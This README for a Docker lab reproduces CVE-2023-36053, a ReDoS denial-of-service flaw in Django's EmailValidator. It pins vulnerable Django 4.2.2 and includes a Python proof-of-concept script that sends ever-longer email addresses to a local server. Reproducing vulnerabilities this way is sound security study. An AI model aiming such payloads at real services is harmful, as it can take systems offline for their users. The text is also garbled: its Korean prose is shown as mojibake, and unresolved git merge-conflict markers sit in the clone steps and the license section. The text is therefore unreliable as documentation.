# Vulnerable Django Email Validation App (CVE-2023-36053)

ì´ í”„ë¡œì íŠ¸ëŠ” Djangoì˜ `EmailValidator`ì—ì„œ ë°œìƒí•˜ëŠ” **CVE-2023-36053** ReDoS ì·¨ì•½ì ì„ PoCí•˜ê¸° ìœ„í•œ í™˜ê²½ì„ ì œê³µí•©ë‹ˆë‹¤. ê¸´ ì´ë©”ì¼ ì…ë ¥ì„ í†µí•´ ì„œë¹„ìŠ¤ ê±°ë¶€ ê³µê²©ì„ ì¬í˜„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

---

## ğŸ“‚ Project Structure

```
CVE-2023-36053
â”œâ”€â”€ Dockerfile
â”œâ”€â”€ docker-compose.yaml
â”œâ”€â”€ requirements.txt
â”œâ”€â”€ manage.py
â”œâ”€â”€ config/
â”‚   â”œâ”€â”€ __init__.py
â”‚   â”œâ”€â”€ settings.py
â”‚   â”œâ”€â”€ urls.py
â”‚   â””â”€â”€ wsgi.py
â””â”€â”€ vuln_app/
    â”œâ”€â”€ __init__.py
    â”œâ”€â”€ views.py
    â””â”€â”€ urls.py
```

---

## ğŸš€ Prerequisites

- **Docker** 20.10 ì´ìƒ ì„¤ì¹˜  
- **docker-compose** 1.29 ì´ìƒ ì„¤ì¹˜  

---

## ğŸ³ Docker & Docker Compose í™˜ê²½ êµ¬ì„±

1. **ë ˆí¬ì§€í† ë¦¬ í´ë¡ **
   ```bash
   git clone https://github.com/yourusername/vuln-django-email.git
<<<<<<< HEAD
   cd Django/CVE-2023-36053
=======
   cd kr-vulhub/Django/CVE-2023-36053/CVE-2023
>>>>>>> 41f7ce99a4fdea865beaa332bf69fd7d51110093
   ```

2. **Docker ì´ë¯¸ì§€ ë¹Œë“œ**
   ```bash
   docker-compose build
   ```

3. **ì»¨í…Œì´ë„ˆ ì‹¤í–‰**
   ```bash
   docker-compose up -d
   ```

4. **ì„œë²„ ìƒíƒœ í™•ì¸**
   ```bash
   docker-compose ps
   ```
   - `web` ì„œë¹„ìŠ¤ì˜ `0.0.0.0:8000->8000/tcp` ë°”ì¸ë”© í™•ì¸

5. **ì• í”Œë¦¬ì¼€ì´ì…˜ ì ‘ì† í…ŒìŠ¤íŠ¸**
   ```bash
   curl http://localhost:8000/vuln/ -d "email=test@example.com"
   ```

---

## ğŸ”§ Dockerfile

```dockerfile
FROM python:3.9-slim
WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .
EXPOSE 8000
CMD ["python", "manage.py", "runserver", "0.0.0.0:8000"]
```

---

## ğŸ”§ docker-compose.yaml

```yaml
version: "3"
services:
  web:
    build: .
    ports:
      - "8000:8000"
    volumes:
      - .:/app
    environment:
      - PYTHONUNBUFFERED=1
```

---

## ğŸ“‹ Dependencies

- `Django==4.2.2`
- `requests`

```text
# requirements.txt
Django==4.2.2
requests
```

---

## ğŸ¯ PoC ìŠ¤í¬ë¦½íŠ¸ (poc.py)

ê¸´ ì´ë©”ì¼ ì…ë ¥ì— ë”°ë¥¸ ì‘ë‹µ ì‹œê°„ì„ ì¸¡ì •í•˜ëŠ” ìŠ¤í¬ë¦½íŠ¸ì…ë‹ˆë‹¤:

```python
import requests
import time

def test_email(lengths):
    url = "http://localhost:8000/vuln/"
    for n in lengths:
        email = "test@" + ("a." * n) + "example.com"
        start = time.time()
        res = requests.post(url, data={"email": email})
        elapsed = time.time() - start
        print(f"labels={n}, status={res.status_code}, time={elapsed:.3f}s")

if __name__ == "__main__":
    test_email([10, 100, 1000, 10000, 50000])
```

---

## ğŸ“‹ Endpoints

- **POST** `/vuln/`
  - Form data: `email` (string)
  - Response: `Valid` ë˜ëŠ” `Invalid`

---

## ğŸ“ˆ í…ŒìŠ¤íŠ¸ ë° ê²°ê³¼

1. `docker-compose up -d` í›„ ì„œë²„ ì‹¤í–‰  
2. `python3 poc.py` ì‹¤í–‰  
3. ì…ë ¥ ê¸¸ì´ì— ë”°ë¥¸ ì‘ë‹µ ì‹œê°„ ë³€í™” í™•ì¸

![image](https://github.com/user-attachments/assets/be10d405-27fe-451e-a5c3-78cf0a32579a)


*ë¼ë²¨ ìˆ˜ê°€ ëŠ˜ì–´ë‚¨ì— ë”°ë¼ ì²˜ë¦¬ ì§€ì—°ì´ ê¸°í•˜ê¸‰ìˆ˜ì ìœ¼ë¡œ ì¦ê°€í•¨ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.*

---

## ğŸ“„ License

<<<<<<< HEAD
MIT License. ìì„¸í•œ ë‚´ìš©ì€ [LICENSE](LICENSE) íŒŒì¼ì„ ì°¸ê³ í•˜ì„¸ìš”.

---

## ğŸ”— GitHub Repository

[https://github.com/yourusername/vuln-django-email](https://github.com/yourusername/vuln-django-email)
=======
MIT License. See [LICENSE](LICENSE) for details.
>>>>>>> 41f7ce99a4fdea865beaa332bf69fd7d51110093
